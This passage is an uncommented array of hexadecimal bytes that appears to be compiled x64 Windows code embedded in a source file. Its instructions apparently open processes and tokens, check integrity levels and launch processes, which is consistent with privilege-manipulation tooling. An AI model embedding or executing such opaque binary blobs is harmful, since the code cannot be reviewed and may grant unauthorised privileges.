	0x48, 0x8D, 0x7C, 0x24, 0x70, 0x33, 0xC0, 0x48, 0xC7, 0x85, 0xA0, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0x00, 0xB9, 0x00, 0x01, 0x00, 0x00, 0xC7, 0x85, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x00, 0xF3, 0xAA, 0x0F, 0x57, 0xC0, 0x66, 0xC7, 0x85, 0x94, 0x00, 0x00, 0x00, 0x00, 0x01, 0x0F,
	0x57, 0xC9, 0xC7, 0x44, 0x24, 0x20, 0x30, 0x00, 0x00, 0x00, 0x0F, 0x57, 0xF6, 0xC7, 0x44, 0x24,
	0x38, 0x00, 0x00, 0x00, 0x00, 0xB9, 0x66, 0x65, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x70, 0xF3,
	0x0F, 0x7F, 0x44, 0x24, 0x28, 0xF3, 0x0F, 0x7F, 0x4C, 0x24, 0x40, 0x0F, 0x11, 0x74, 0x24, 0x60,
	0xE8, 0xF3, 0xFE, 0xFF, 0xFF, 0x48, 0x8D, 0x54, 0x24, 0x70, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xFF,
	0x15, 0xAB, 0x2E, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xFF, 0x15, 0x76, 0x2E,
	0x00, 0x00, 0x48, 0x89, 0x85, 0x98, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xB1, 0x00,
	0x00, 0x00, 0xB9, 0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x9B, 0x2E, 0x00, 0x00, 0x44, 0x8B, 0xC0,
	0xBA, 0x08, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0x48, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15, 0x2C, 0x2E, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x48,
	0x85, 0xC0, 0x74, 0x7F, 0x41, 0xB0, 0x01, 0x48, 0x8D, 0x95, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B,
	0xC8, 0xFF, 0x15, 0x09, 0x2E, 0x00, 0x00, 0x33, 0xD2, 0x85, 0xC0, 0x78, 0x4C, 0x48, 0x8B, 0xCF,
	0xFF, 0x15, 0x0A, 0x2E, 0x00, 0x00, 0x48, 0x8B, 0xD7, 0x48, 0x8D, 0x8D, 0x98, 0x00, 0x00, 0x00,
	0x66, 0x0F, 0x7E, 0x30, 0xFF, 0x15, 0x8E, 0x2E, 0x00, 0x00, 0x85, 0xC0, 0x79, 0x0B, 0x48, 0x8B,
	0xCF, 0xFF, 0x15, 0x49, 0x2E, 0x00, 0x00, 0xEB, 0x3A, 0x4C, 0x8B, 0x8D, 0x98, 0x00, 0x00, 0x00,
	0x4C, 0x8D, 0x44, 0x24, 0x20, 0xBA, 0x00, 0x00, 0x00, 0x02, 0x48, 0x8D, 0x8D, 0xA0, 0x00, 0x00,
	0x00, 0xFF, 0x15, 0x59, 0x2E, 0x00, 0x00, 0xEB, 0x1A, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00,
	0x00, 0x00, 0x4C, 0x8B, 0xC7, 0x48, 0x8B, 0x48, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15, 0x2D,
	0x2E, 0x00, 0x00, 0x48, 0x8B, 0x8D, 0x98, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x06, 0xFF,
	0x15, 0xBB, 0x2D, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xA0, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x9C, 0x24,
	0x80, 0x01, 0x00, 0x00, 0x49, 0x8B, 0x7B, 0x28, 0x41, 0x0F, 0x28, 0x73, 0xF0, 0x49, 0x8B, 0xE3,
	0x5D, 0xC3, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x55, 0x56, 0x57, 0x41, 0x56, 0x41, 0x57,
	0x48, 0x8D, 0xAC, 0x24, 0x30, 0xF7, 0xFF, 0xFF, 0x48, 0x81, 0xEC, 0xD0, 0x09, 0x00, 0x00, 0x33,
	0xDB, 0x41, 0xBF, 0x00, 0x10, 0x00, 0x00, 0x48, 0x89, 0x9D, 0x08, 0x09, 0x00, 0x00, 0x4C, 0x8B,
	0xF1, 0x48, 0x89, 0x9D, 0x10, 0x09, 0x00, 0x00, 0x4C, 0x89, 0xBD, 0x18, 0x09, 0x00, 0x00, 0xE8,
	0x34, 0xFE, 0xFF, 0xFF, 0x48, 0x8B, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x48, 0x01, 0x00, 0x00,
	0x33, 0xC0, 0x48, 0x8D, 0x7D, 0x90, 0xB9, 0x00, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x55, 0x90, 0xF3,
	0xAA, 0xB9, 0x64, 0x63, 0x00, 0x00, 0xE8, 0x7D, 0xFD, 0xFF, 0xFF, 0x48, 0x8D, 0x55, 0x90, 0x48,
	0x8D, 0x4C, 0x24, 0x50, 0xFF, 0x15, 0x36, 0x2D, 0x00, 0x00, 0x48, 0x8D, 0x44, 0x24, 0x50, 0xC7,
	0x44, 0x24, 0x60, 0x30, 0x00, 0x00, 0x00, 0x0F, 0x57, 0xC0, 0x48, 0x89, 0x44, 0x24, 0x70, 0x4C,
	0x8D, 0x44, 0x24, 0x60, 0x48, 0x89, 0x74, 0x24, 0x68, 0xBA, 0x1F, 0x00, 0x0F, 0x00, 0xC7, 0x44,
	0x24, 0x78, 0x40, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x08, 0x09, 0x00, 0x00, 0xF3, 0x0F, 0x7F,
	0x45, 0x80, 0xFF, 0x15, 0x68, 0x2D, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0xCF, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x8D, 0x08, 0x09, 0x00, 0x00, 0x8D, 0x43, 0x02, 0x89, 0x44, 0x24, 0x48, 0x4C, 0x8D,
	0x85, 0x10, 0x09, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x10, 0x00, 0x45, 0x33, 0xC9,
	0x89, 0x44, 0x24, 0x38, 0x48, 0x83, 0xCA, 0xFF, 0x48, 0x8D, 0x85, 0x18, 0x09, 0x00, 0x00, 0x48,
	0x89, 0x44, 0x24, 0x30, 0x48, 0x89, 0x5C, 0x24, 0x28, 0x4C, 0x89, 0x7C, 0x24, 0x20, 0xFF, 0x15,
	0x5C, 0x2C, 0x00, 0x00, 0x85, 0xC0, 0x78, 0x7A, 0x48, 0x8B, 0x95, 0x10, 0x09, 0x00, 0x00, 0x48,
	0x8D, 0xBD, 0x90, 0x00, 0x00, 0x00, 0x41, 0xBF, 0x34, 0x08, 0x00, 0x00, 0x33, 0xC0, 0x41, 0x8B,
	0xCF, 0x45, 0x8B, 0xC7, 0xF3, 0xAA, 0x48, 0x8D, 0x8D, 0x90, 0x00, 0x00, 0x00, 0xE8, 0xEE, 0x21,
	0x00, 0x00, 0x48, 0x8B, 0x95, 0x08, 0x09, 0x00, 0x00, 0x48, 0x83, 0xC9, 0xFF, 0xFF, 0x15, 0xC5,
	0x2C, 0x00, 0x00, 0x8B, 0xBD, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 0x90, 0x00, 0x00, 0x00,
	0x45, 0x8B, 0xC7, 0x89, 0x9D, 0x90, 0x00, 0x00, 0x00, 0x33, 0xC9, 0xFF, 0x15, 0x8F, 0x2C, 0x00,
	0x00, 0x3B, 0xF8, 0x75, 0x1D, 0x49, 0x8B, 0xCE, 0x89, 0xBD, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8D,
	0x95, 0x90, 0x00, 0x00, 0x00, 0x45, 0x8B, 0xC7, 0xE8, 0xA3, 0x21, 0x00, 0x00, 0xBB, 0x01, 0x00,
	0x00, 0x00, 0x48, 0x8B, 0x8D, 0x08, 0x09, 0x00, 0x00, 0xFF, 0x15, 0x41, 0x2C, 0x00, 0x00, 0x48,
	0x8B, 0xCE, 0xFF, 0x15, 0x38, 0x2C, 0x00, 0x00, 0x8B, 0xC3, 0x48, 0x8B, 0x9C, 0x24, 0x00, 0x0A,
	0x00, 0x00, 0x48, 0x81, 0xC4, 0xD0, 0x09, 0x00, 0x00, 0x41, 0x5F, 0x41, 0x5E, 0x5F, 0x5E, 0x5D,
	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x7C, 0x24, 0x18, 0x55, 0x48,
	0x8B, 0xEC, 0x48, 0x83, 0xEC, 0x60, 0x48, 0x8B, 0xF9, 0x48, 0xC7, 0x45, 0x18, 0x00, 0x00, 0x00,
	0x00, 0xE8, 0xA2, 0xFC, 0xFF, 0xFF, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x74, 0x65, 0x48, 0x8B,
	0xD7, 0x48, 0x8D, 0x4D, 0xC0, 0xFF, 0x15, 0xC5, 0x2B, 0x00, 0x00, 0x48, 0x8D, 0x45, 0xC0, 0xC7,
	0x45, 0xD0, 0x30, 0x00, 0x00, 0x00, 0x0F, 0x57, 0xC0, 0x48, 0x89, 0x45, 0xE0, 0x4C, 0x8D, 0x45,
	0xD0, 0x48, 0x89, 0x5D, 0xD8, 0xBA, 0x03, 0x00, 0x1F, 0x00, 0xC7, 0x45, 0xE8, 0x40, 0x00, 0x00,
	0x00, 0x48, 0x8D, 0x4D, 0x18, 0xF3, 0x0F, 0x7F, 0x45, 0xF0, 0xFF, 0x15, 0x70, 0x2B, 0x00, 0x00,
	0x85, 0xC0, 0x78, 0x16, 0x48, 0x8B, 0x4D, 0x18, 0x33, 0xD2, 0xFF, 0x15, 0xC8, 0x2B, 0x00, 0x00,
	0x48, 0x8B, 0x4D, 0x18, 0xFF, 0x15, 0x96, 0x2B, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x8D,
	0x2B, 0x00, 0x00, 0x4C, 0x8D, 0x5C, 0x24, 0x60, 0x49, 0x8B, 0x5B, 0x10, 0x49, 0x8B, 0x7B, 0x20,
	0x49, 0x8B, 0xE3, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0x4C, 0x8B, 0xC1, 0x48, 0x85, 0xC9, 0x0F, 0x84,
	0xCE, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x50,
	0x60, 0x4C, 0x8B, 0x4A, 0x20, 0xC7, 0x01, 0x68, 0x00, 0x00, 0x00, 0x49, 0x8B, 0x81, 0xD8, 0x00,
	0x00, 0x00, 0x48, 0x89, 0x41, 0x08, 0x49, 0x8B, 0x81, 0xC8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x41,
	0x10, 0x49, 0x8B, 0x81, 0xB8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x41, 0x18, 0x41, 0x8B, 0x81, 0x88,
	0x00, 0x00, 0x00, 0x89, 0x41, 0x20, 0x41, 0x8B, 0x81, 0x8C, 0x00, 0x00, 0x00, 0x89, 0x41, 0x24,
	0x41, 0x8B, 0x81, 0x90, 0x00, 0x00, 0x00, 0x89, 0x41, 0x28, 0x41, 0x8B, 0x81, 0x94, 0x00, 0x00,
	0x00, 0x89, 0x41, 0x2C, 0x41, 0x8B, 0x81, 0x98, 0x00, 0x00, 0x00, 0x89, 0x41, 0x30, 0x41, 0x8B,
	0x81, 0x9C, 0x00, 0x00, 0x00, 0x89, 0x41, 0x34, 0x41, 0x8B, 0x81, 0xA0, 0x00, 0x00, 0x00, 0x89,
	0x41, 0x38, 0x41, 0x8B, 0x89, 0xA4, 0x00, 0x00, 0x00, 0x41, 0x89, 0x48, 0x3C, 0x41, 0x0F, 0xB7,
	0x81, 0xA8, 0x00, 0x00, 0x00, 0x66, 0x41, 0x89, 0x40, 0x40, 0x41, 0x0F, 0xB7, 0x81, 0xE0, 0x00,
	0x00, 0x00, 0x66, 0x41, 0x89, 0x40, 0x42, 0x49, 0x8B, 0x81, 0xE8, 0x00, 0x00, 0x00, 0x49, 0x89,
	0x40, 0x48, 0xF7, 0xC1, 0x00, 0x03, 0x00, 0x00, 0x74, 0x18, 0x49, 0x8B, 0x41, 0x20, 0x49, 0x89,
	0x40, 0x50, 0x49, 0x8B, 0x41, 0x28, 0x49, 0x89, 0x40, 0x58, 0x49, 0x8B, 0x41, 0x30, 0x49, 0x89,
	0x40, 0x60, 0xC3, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x48,
	0x89, 0x78, 0x18, 0x4C, 0x89, 0x60, 0x20, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8D, 0xA8, 0xD8,
	0xF9, 0xFF, 0xFF, 0x48, 0x81, 0xEC, 0x10, 0x07, 0x00, 0x00, 0x4C, 0x8B, 0xF1, 0x8B, 0xDA, 0x33,
	0xC0, 0x48, 0x8D, 0x7D, 0xF0, 0xB9, 0x0A, 0x02, 0x00, 0x00, 0x33, 0xF6, 0xF3, 0xAA, 0x48, 0x8D,
	0x4D, 0xF0, 0xB2, 0x01, 0x44, 0x8D, 0x7E, 0x10, 0x45, 0x33, 0xE4, 0xE8, 0x88, 0xF9, 0xFF, 0xFF,
	0x8D, 0x56, 0x68, 0x33, 0xC0, 0x8B, 0xCA, 0x48, 0x8D, 0x7D, 0x80, 0xF3, 0xAA, 0x48, 0x8D, 0x4D,
	0x80, 0x89, 0x55, 0x80, 0xE8, 0xBF, 0xFE, 0xFF, 0xFF, 0x4D, 0x85, 0xF6, 0x74, 0x4B, 0x85, 0xDB,
	0x74, 0x47, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x83, 0x00, 0x10,
	0x00, 0x00, 0x8D, 0x56, 0x08, 0x8B, 0xFB, 0x48, 0x8B, 0x48, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF,
	0x15, 0xB3, 0x29, 0x00, 0x00, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x8D, 0x00, 0x00,
	0x00, 0x45, 0x33, 0xFF, 0x41, 0x8D, 0x74, 0x24, 0x01, 0x44, 0x8B, 0xC7, 0x49, 0x8B, 0xD6, 0x48,
	0x8B, 0xC8, 0xE8, 0x39, 0x1F, 0x00, 0x00, 0xEB, 0x75, 0x33, 0xC0, 0x48, 0x8D, 0xBD, 0x00, 0x02,
	0x00, 0x00, 0xB9, 0x10, 0x04, 0x00, 0x00, 0x48, 0x8D, 0x55, 0xF0, 0xF3, 0xAA, 0x48, 0x8D, 0x8D,
	0x00, 0x02, 0x00, 0x00, 0xE8, 0xAB, 0x0D, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x88, 0x2A, 0x00, 0x00,
	0x48, 0x8D, 0x8D, 0x00, 0x02, 0x00, 0x00, 0xE8, 0xEC, 0x0C, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x79,
	0x2A, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x00, 0x02, 0x00, 0x00, 0xE8, 0xD9, 0x0C, 0x00, 0x00, 0x48,
	0x8D, 0x15, 0x6A, 0x2A, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x00, 0x02, 0x00, 0x00, 0xE8, 0xC6, 0x0C,
	0x00, 0x00, 0x48, 0x8D, 0x15, 0x5F, 0x2A, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x00, 0x02, 0x00, 0x00,
	0xE8, 0xB3, 0x0C, 0x00, 0x00, 0x33, 0xDB, 0x4C, 0x8D, 0xA5, 0x00, 0x02, 0x00, 0x00, 0xB8, 0x05,
	0x00, 0x00, 0x00, 0xC7, 0x45, 0xBC, 0x01, 0x00, 0x00, 0x00, 0x66, 0x89, 0x45, 0xC0, 0x48, 0x8D,
	0x7C, 0x24, 0x60, 0x33, 0xC0, 0x45, 0x33, 0xC9, 0x4C, 0x8B, 0xC3, 0x49, 0x8B, 0xD4, 0x8D, 0x48,
	0x18, 0xF3, 0xAA, 0x48, 0x8D, 0x44, 0x24, 0x60, 0x33, 0xC9, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48,
	0x8D, 0x45, 0x80, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8D, 0x45, 0xF0, 0x48, 0x89, 0x44, 0x24,
	0x40, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x44, 0x89, 0x7C, 0x24, 0x30, 0xC7,
	0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00,
	0xFF, 0x15, 0xCA, 0x26, 0x00, 0x00, 0x8B, 0xF8, 0x85, 0xC0, 0x74, 0x16, 0x48, 0x8B, 0x4C, 0x24,
	0x60, 0xFF, 0x15, 0xF9, 0x28, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x68, 0xFF, 0x15, 0xEE, 0x28,
	0x00, 0x00, 0x85, 0xF6, 0x74, 0x1C, 0x65, 0x48, 0x8B, 0x0C, 0x25, 0x30, 0x00, 0x00, 0x00, 0x4C,
	0x8B, 0xC3, 0x33, 0xD2, 0x48, 0x8B, 0x49, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15, 0xFE, 0x28,
	0x00, 0x00, 0x4C, 0x8D, 0x9C, 0x24, 0x10, 0x07, 0x00, 0x00, 0x8B, 0xC7, 0x49, 0x8B, 0x5B, 0x20,
	0x49, 0x8B, 0x73, 0x28, 0x49, 0x8B, 0x7B, 0x30, 0x4D, 0x8B, 0x63, 0x38, 0x49, 0x8B, 0xE3, 0x41,
	0x5F, 0x41, 0x5E, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48,
	0x89, 0x70, 0x10, 0x48, 0x89, 0x78, 0x18, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
	0x48, 0x8D, 0xA8, 0xD8, 0xF9, 0xFF, 0xFF, 0x48, 0x81, 0xEC, 0x00, 0x07, 0x00, 0x00, 0x33, 0xF6,
	0x41, 0x8B, 0xD8, 0x45, 0x33, 0xED, 0x33, 0xC0, 0x4C, 0x8B, 0xF2, 0x4C, 0x8B, 0xF9, 0x44, 0x8D,
	0x66, 0x10, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0x92, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x7D, 0xE0, 0xB9,
	0x0A, 0x02, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8D, 0x4D, 0xE0, 0xB2, 0x01, 0xE8, 0x87, 0xF7, 0xFF,
	0xFF, 0x8D, 0x56, 0x68, 0x33, 0xC0, 0x8B, 0xCA, 0x48, 0x8D, 0x7C, 0x24, 0x70, 0xF3, 0xAA, 0x48,
	0x8D, 0x4C, 0x24, 0x70, 0x89, 0x54, 0x24, 0x70, 0xE8, 0xBB, 0xFC, 0xFF, 0xFF, 0x4D, 0x85, 0xF6,
	0x74, 0x4A, 0x85, 0xDB, 0x74, 0x46, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00, 0x4C,
	0x8D, 0x83, 0x00, 0x10, 0x00, 0x00, 0x8D, 0x56, 0x08, 0x8B, 0xFB, 0x48, 0x8B, 0x48, 0x60, 0x48,
	0x8B, 0x49, 0x30, 0xFF, 0x15, 0xAF, 0x27, 0x00, 0x00, 0x48, 0x8B, 0xD8, 0x48, 0x85, 0xC0, 0x0F,
	0x84, 0x8C, 0x00, 0x00, 0x00, 0x45, 0x33, 0xE4, 0x41, 0x8D, 0x75, 0x01, 0x44, 0x8B, 0xC7, 0x49,
	0x8B, 0xD6, 0x48, 0x8B, 0xC8, 0xE8, 0x36, 0x1D, 0x00, 0x00, 0xEB, 0x75, 0x33, 0xC0, 0x48, 0x8D,
	0xBD, 0xF0, 0x01, 0x00, 0x00, 0xB9, 0x10, 0x04, 0x00, 0x00, 0x48, 0x8D, 0x55, 0xE0, 0xF3, 0xAA,
	0x48, 0x8D, 0x8D, 0xF0, 0x01, 0x00, 0x00, 0xE8, 0xA8, 0x0B, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x85,
	0x28, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0xF0, 0x01, 0x00, 0x00, 0xE8, 0xE9, 0x0A, 0x00, 0x00, 0x48,
	0x8D, 0x15, 0x76, 0x28, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0xF0, 0x01, 0x00, 0x00, 0xE8, 0xD6, 0x0A,
	0x00, 0x00, 0x48, 0x8D, 0x15, 0x67, 0x28, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0xF0, 0x01, 0x00, 0x00,
	0xE8, 0xC3, 0x0A, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x5C, 0x28, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0xF0,
	0x01, 0x00, 0x00, 0xE8, 0xB0, 0x0A, 0x00, 0x00, 0x33, 0xDB, 0x4C, 0x8D, 0xAD, 0xF0, 0x01, 0x00,
	0x00, 0xB8, 0x05, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xAC, 0x01, 0x00, 0x00, 0x00, 0x66, 0x89, 0x45,
	0xB0, 0x48, 0x8D, 0x7C, 0x24, 0x50, 0x33, 0xC0, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x48, 0x8B,
	0xD3, 0x8D, 0x48, 0x18, 0xF3, 0xAA, 0x48, 0x8D, 0x44, 0x24, 0x50, 0x49, 0x8B, 0xCD, 0x48, 0x89,
	0x44, 0x24, 0x48, 0x48, 0x8D, 0x44, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8D, 0x45,
	0xE0, 0x48, 0x89, 0x44, 0x24, 0x38, 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x44,
	0x89, 0x64, 0x24, 0x28, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00, 0x41, 0xFF, 0xD7, 0x8B,
	0xF8, 0x85, 0xC0, 0x74, 0x16, 0x48, 0x8B, 0x4C, 0x24, 0x50, 0xFF, 0x15, 0x00, 0x27, 0x00, 0x00,
	0x48, 0x8B, 0x4C, 0x24, 0x58, 0xFF, 0x15, 0xF5, 0x26, 0x00, 0x00, 0x85, 0xF6, 0x74, 0x1C, 0x65,
	0x48, 0x8B, 0x0C, 0x25, 0x30, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0xC3, 0x33, 0xD2, 0x48, 0x8B, 0x49,
	0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15, 0x05, 0x27, 0x00, 0x00, 0x8B, 0xC7, 0x4C, 0x8D, 0x9C,
	0x24, 0x00, 0x07, 0x00, 0x00, 0x49, 0x8B, 0x5B, 0x30, 0x49, 0x8B, 0x73, 0x38, 0x49, 0x8B, 0x7B,
	0x40, 0x49, 0x8B, 0xE3, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5D, 0xC3, 0xCC, 0xCC,
	0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74, 0x24, 0x10, 0x55, 0x57, 0x41, 0x55, 0x41, 0x56,
	0x41, 0x57, 0x48, 0x8D, 0xAC, 0x24, 0x40, 0xFA, 0xFF, 0xFF, 0x48, 0x81, 0xEC, 0xC0, 0x06, 0x00,
	0x00, 0x33, 0xFF, 0x8B, 0xDA, 0x48, 0x8B, 0xF1, 0x48, 0x89, 0x7C, 0x24, 0x30, 0xBA, 0x00, 0x00,
	0x00, 0x02, 0x89, 0xBD, 0x08, 0x06, 0x00, 0x00, 0x48, 0x83, 0xC9, 0xFF, 0x89, 0xBD, 0x00, 0x06,
	0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x30, 0x45, 0x33, 0xF6, 0x45, 0x33, 0xFF, 0xFF, 0x15, 0xF5,
	0x25, 0x00, 0x00, 0x45, 0x8D, 0x6E, 0x01, 0x85, 0xC0, 0x78, 0x7B, 0x48, 0x8B, 0x4C, 0x24, 0x30,
	0x45, 0x8D, 0x4E, 0x04, 0x48, 0x8D, 0x85, 0x00, 0x06, 0x00, 0x00, 0x44, 0x89, 0x8D, 0x00, 0x06,
	0x00, 0x00, 0x4C, 0x8D, 0x85, 0x08, 0x06, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x8D, 0x57,
	0x1A, 0xFF, 0x15, 0x01, 0x24, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x4B, 0x39, 0xBD, 0x08, 0x06, 0x00,
	0x00, 0x74, 0x43, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x45, 0x8D, 0x4E, 0x1C, 0x48, 0x8D, 0x85, 0x00,
	0x06, 0x00, 0x00, 0x44, 0x89, 0x8D, 0x00, 0x06, 0x00, 0x00, 0x4C, 0x8D, 0x45, 0x80, 0x48, 0x89,
	0x44, 0x24, 0x20, 0x8D, 0x57, 0x19, 0xFF, 0x15, 0xCC, 0x23, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x16,
	0x48, 0x8B, 0x4D, 0x80, 0x33, 0xD2, 0xFF, 0x15, 0xB4, 0x23, 0x00, 0x00, 0x81, 0x38, 0x00, 0x30,
	0x00, 0x00, 0x41, 0x0F, 0x43, 0xFD, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x48, 0x85, 0xC9, 0x74, 0x06,
	0xFF, 0x15, 0xCA, 0x25, 0x00, 0x00, 0x85, 0xFF, 0x0F, 0x84, 0xD3, 0x01, 0x00, 0x00, 0x48, 0x85,
	0xF6, 0x74, 0x45, 0x85, 0xDB, 0x74, 0x41, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,
	0x4C, 0x8D, 0x83, 0x00, 0x10, 0x00, 0x00, 0xBA, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xFB, 0x48,
	0x8B, 0x48, 0x60, 0x48, 0x8B, 0x49, 0x30, 0xFF, 0x15, 0x3B, 0x25, 0x00, 0x00, 0x48, 0x8B, 0xD8,
	0x48, 0x85, 0xC0, 0x74, 0x63, 0x4C, 0x8B, 0xC7, 0x48, 0x8B, 0xD6, 0x48, 0x8B, 0xC8, 0x45, 0x8B,
	0xFD, 0xE8, 0xCA, 0x1A, 0x00, 0x00, 0xEB, 0x50, 0x33, 0xC0, 0x48, 0x8D, 0xBD, 0xB0, 0x01, 0x00,
	0x00, 0xB9, 0x10, 0x04, 0x00, 0x00, 0x33, 0xD2, 0xF3, 0xAA, 0x48, 0x8D, 0x7D, 0xA0, 0xB9, 0x0A,
	0x02, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0x8D, 0x4D, 0xA0, 0xE8, 0x8A, 0xF4, 0xFF, 0xFF, 0x48, 0x8D,
	0x55, 0xA0, 0x48, 0x8D, 0x8D, 0xB0, 0x01, 0x00, 0x00, 0xE8, 0x26, 0x09, 0x00, 0x00, 0x48, 0x8D,
	0x15, 0x23, 0x26, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0xB0, 0x01, 0x00, 0x00, 0xE8, 0x67, 0x08, 0x00,
	0x00, 0x48, 0x8D, 0x9D, 0xB0, 0x01, 0x00, 0x00, 0x33, 0xC0, 0x48, 0x8D, 0x7C, 0x24, 0x50, 0x48,
	0x8D, 0x95, 0x00, 0x06, 0x00, 0x00, 0x48, 0x89, 0x85, 0x00, 0x06, 0x00, 0x00, 0x8D, 0x70, 0x30,
	0x8B, 0xCE, 0xF3, 0xAA, 0x48, 0x8D, 0x0D, 0xB9, 0x05, 0x00, 0x00, 0x89, 0x74, 0x24, 0x50, 0x48,
	0xC7, 0x44, 0x24, 0x58, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x15, 0x5A, 0x24, 0x00, 0x00, 0x48, 0x8B,
	0x95, 0x00, 0x06, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x75, 0x5B, 0x48, 0x8D, 0x4C, 0x24, 0x50, 0xE8,
	0x60, 0x06, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x84, 0xA0, 0x00, 0x00, 0x00, 0x8D, 0x7E, 0xDA, 0x48,
	0x8D, 0x95, 0x08, 0x06, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x08, 0x06, 0x00, 0x00, 0xC0, 0xB4, 0xB3,
	0xFF, 0x33, 0xC9, 0xFF, 0x15, 0xA7, 0x24, 0x00, 0x00, 0x48, 0x8D, 0x95, 0x08, 0x06, 0x00, 0x00,
	0x4C, 0x89, 0xB5, 0x08, 0x06, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x56, 0x05, 0x00, 0x00, 0xFF, 0x15,
	0x04, 0x24, 0x00, 0x00, 0x48, 0x8B, 0x95, 0x08, 0x06, 0x00, 0x00, 0x49, 0x2B, 0xFD, 0x75, 0xBF,
	0x48, 0x85, 0xD2, 0x74, 0x57, 0x33, 0xC0, 0x48, 0x8D, 0x7C, 0x24, 0x38, 0x8D, 0x48, 0x18, 0xF3,
